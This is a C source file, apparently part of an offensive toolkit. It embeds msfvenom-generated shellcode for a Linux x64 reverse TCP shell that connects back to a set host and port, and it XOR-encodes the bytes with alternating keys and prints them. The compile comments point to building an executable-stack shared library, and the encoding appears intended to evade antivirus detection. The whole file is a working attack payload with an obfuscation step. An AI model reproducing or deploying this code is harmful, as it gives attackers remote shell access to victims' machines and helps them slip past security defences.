#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Compile it with gcc -Wall -fPIC -c -o shared-library.o shared-library.c -z execstack
// Then gcc -shared -o shared-library.so shared-library.o -z execstack

// msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.88 LPORT=443 -f c
unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x01\x58\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x26"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";
int main (int argc, char **argv)
{
char xor_key_par = 'X';
char xor_key_inpar = 'Y';
int payload_length = (int) sizeof(buf);
for (int i=0; i<payload_length; i++)
{
// Si es inpar
if (i % 2){
printf("\\x%02X",buf[i]^xor_key_inpar);
}
// si es par
else{
printf("\\x%02X",buf[i]^xor_key_par);
}
}
return 0;
}
